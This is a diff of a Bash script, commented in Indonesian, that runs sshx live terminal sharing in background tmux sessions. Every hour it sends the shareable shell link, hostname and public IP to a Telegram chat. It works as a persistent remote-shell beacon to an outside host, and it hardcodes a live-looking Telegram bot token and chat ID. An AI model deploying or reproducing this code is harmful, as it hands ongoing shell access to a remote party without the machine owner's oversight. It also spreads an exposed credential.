@@ -5,12 +5,12 @@ CHAT_ID="-1003847935504"
 
 send() {
     curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-    -d "chat_id=$CHAT_ID" \
-    -d "text=$1" \
-    -d "parse_mode=HTML" > /dev/null
+         -d "chat_id=$CHAT_ID" \
+         -d "text=$1" \
+         -d "parse_mode=HTML" > /dev/null
 }
 
-# Detect OS
+# Detect OS & install dependencies
 if [ -f /etc/os-release ]; then
     . /etc/os-release
     OS=$ID
@@ -49,12 +49,16 @@ export PATH=$PATH:$HOME/.sshx/bin
 # Hapus tmux session lama
 tmux kill-session -t sshxmon 2>/dev/null
 
-# Ambil link sshx awal
-INITIAL_OUT=$(timeout 8 sshx 2>&1)
-INITIAL_LINK=$(echo "$INITIAL_OUT" | grep -o "https://sshx.io/s/[^ ]*")
+# Jalankan SSHX live di tmux tanpa timeout
+tmux new-session -d -s sshxmon bash -c 'sshx'
+
+# Kirim link awal Telegram
 HOST=$(hostname)
 IP=$(curl -s ifconfig.me)
 TIME=$(date)
+
+INITIAL_OUT=$(sshx --quiet 2>&1 | head -n 1)
+LINK=$(echo "$INITIAL_OUT" | grep -o "https://sshx.io/s/[^ ]*")
 
 send "✅ <b>SSHX MONITOR STARTED</b>
 Host: $HOST
@@ -62,19 +66,19 @@ IP: $IP
 Time: $TIME
 
 sshx v0.4.1
-➜ Link: $INITIAL_LINK
+➜ Link: $LINK
 ➜ Shell: /bin/bash"
 
-# Jalankan sshx di tmux background (loop setiap 1 jam)
-tmux new-session -d -s sshxmon bash -c '
+# Loop update link setiap 1 jam
+tmux new-session -d -s sshxmon-updater bash -c '
 BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
 CHAT_ID="-1003847935504"
 
 send() {
     curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-    -d "chat_id=$CHAT_ID" \
-    -d "text=$1" \
-    -d "parse_mode=HTML" > /dev/null
+         -d "chat_id=$CHAT_ID" \
+         -d "text=$1" \
+         -d "parse_mode=HTML" > /dev/null
 }
 
 while true
@@ -82,11 +86,10 @@ do
     HOST=$(hostname)
     IP=$(curl -s ifconfig.me)
     TIME=$(date)
-
-    OUT=$(timeout 8 sshx 2>&1)
+    OUT=$(sshx --quiet 2>&1 | head -n 1)
     LINK=$(echo "$OUT" | grep -o "https://sshx.io/s/[^ ]*")
 
-    MSG="✅ <b>SSHX MONITOR STARTED</b>
+    MSG="✅ <b>SSHX MONITOR UPDATE</b>
 Host: $HOST
 IP: $IP
 Time: $TIME
